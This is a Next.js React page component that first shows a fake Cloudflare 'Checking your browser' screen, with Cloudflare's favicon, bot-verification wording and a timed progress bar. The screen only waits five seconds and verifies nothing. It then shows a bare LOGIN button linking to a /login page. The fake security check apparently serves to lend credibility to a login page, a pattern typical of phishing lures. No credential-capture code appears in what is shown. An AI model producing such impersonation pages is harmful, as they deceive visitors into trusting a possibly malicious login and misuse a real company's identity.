"use client";
import { useState, useEffect } from 'react';
import "./page.css"; // Your separate CSS file

const Page = () => {
  const [page, setPage] = useState(false); // For login click
  const [showL7, setShowL7] = useState(true); // To control L7 display

  useEffect(() => {
    const hasSeenL7 = sessionStorage.getItem("seenL7");
    if (hasSeenL7) {
      setShowL7(false);
    } else {
      setShowL7(true);
      setTimeout(() => {
        setShowL7(false);
        sessionStorage.setItem("seenL7", "true");
      }, 5000);
    }
  }, []);

if (showL7) {
  return (
    <div
      style={{
        background: "#f4f4f4",
        color: "#161616",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        minHeight: "100dvh", // ✅ Dynamic height for mobile browsers
        width: "100vw",
        padding: "1rem",
        boxSizing: "border-box",
      }}
    >
      <style>{`
        :root {
          --primary: #f97316;
          --accent: #facc15;
          --background: #f4f4f4;
          --foreground: #161616;
          --muted: #6f6f6f;
        }

        body {
          margin: 0;
          background: var(--background);
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        .container-new {
          text-align: center;
          background: white;
          padding: 2.5rem;
          max-width: 510px;
          width: 100%;
          border-radius: 16px;
          box-shadow: 0 8px 40px rgba(0, 0, 0, 0.1);
        }

        .logo {
          display: flex;
          justify-content: center;
          align-items: center;
          margin-bottom: 1.5rem;
        }

        .logo img {
          height: 55px;
        }

        h2 {
          font-size: 1.3rem;
          font-weight: 700;
          margin-bottom: 1rem;
        }

        p {
          font-size: 0.95rem;
          color: var(--muted);
          margin: 0.4rem 0;
          line-height: 1.5;
        }

        .progress-bar {
          margin-top: 2rem;
          height: 10px;
          width: 100%;
          background: #eee;
          border-radius: 999px;
          overflow: hidden;
        }

        .progress-bar-fill {
          height: 100%;
          width: 0%;
          background: linear-gradient(to right, var(--primary), var(--accent));
          animation: fillProgress 5s linear forwards;
        }

        @keyframes fillProgress {
          0% { width: 0%; }
          100% { width: 100%; }
        }

        @media (max-width: 480px) {
          html, body {
            height: 100%;
            margin: 0;
            padding: 0;
          }

          .container-new {
            width: 100%;
            max-width: 100%;
            padding: 1.5rem 1rem;
            margin: 0 auto;
            box-shadow: none;
            border-radius: 12px;
          }

          .logo {
            margin-bottom: 1rem;
          }

          .logo img {
            height: 28px;
          }

          h2 {
            font-size: 1rem;
            margin-bottom: 0.75rem;
          }

          p {
            font-size: 0.8rem;
            margin: 0.25rem 0;
          }

          .progress-bar {
            height: 8px;
            margin-top: 1.5rem;
          }
        }
      `}</style>

        <div className="container-new">
          <div className="logo">
            <img src="https://www.cloudflare.com/favicon.ico" alt="Cloudflare Logo" />
          </div>
          <h2>Checking your browser before accessing...</h2>
          <p>This process is automatic. Your browser will redirect shortly.</p>
          <p>Please wait while we verify you are not a bot...</p>

          <div className="progress-bar">
            <div className="progress-bar-fill"></div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={page ? 'h-[100vh] bg-black' : 'h-[100vh] bg-white'}>
      {!page && (
        <input 
          type="submit" 
          value="LOGIN" 
          className="btnzz" 
          onClick={() => setPage(true)} 
        />
      )}

      {page && (
        <div className='container flex justify-center items-center w-[100vw]'>
          <a href="/login">
            <div className='img'></div>
          </a>
        </div>
      )}
    </div>
  );
};

export default Page;
